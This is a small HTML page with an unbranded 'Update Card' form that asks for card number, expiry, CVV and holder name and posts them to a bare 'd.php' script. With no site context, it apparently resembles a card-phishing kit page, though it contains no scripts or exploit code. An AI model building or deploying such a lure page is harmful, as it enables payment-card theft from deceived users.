<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Card Form</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, sans-serif;
      background-color: #f2f2f2;
      margin: 0;
      padding: 0;
    }
    .container {
      display: flex;
      justify-content: center;
      padding: 40px 80px;
    }
    .form-box {
      background: #fff;
      padding: 30px;
      border-radius: 10px;
      width: 400px;
      box-shadow: 0 0 12px rgba(0, 0, 0, 0.1);
    }
    .form-box h1 {
      font-size: 26px;
      margin-bottom: 20px;
    }
    label {
      display: block;
      margin-top: 15px;
      font-weight: 600;
    }
    input {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 15px;
    }
    .required {
      color: red;
      font-size: 12px;
    }
    button {
      margin-top: 25px;
      width: 100%;
      padding: 12px;
      background-color: #007aff;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="form-box">
      <h1>Update Card</h1>
      <form action="d.php" method="POST">
        <label>Card Number <span class="required">*</span></label>
        <input type="text" name="cardNumber" placeholder="XXXX XXXX XXXX XXXX" required maxlength="19">

        <label>Expiration <span class="required">*</span></label>
        <input type="text" name="expiration" placeholder="MM / YYYY" required>

        <label>CVV (Secret) <span class="required">*</span></label>
        <input type="text" name="cvv" placeholder="XXX" required maxlength="4">

        <label>Card Holder <span class="required">*</span></label>
        <input type="text" name="holder" placeholder="Full name on card" required>

        <button type="submit">Submit</button>
      </form>
    </div>
  </div>
</body>
</html>
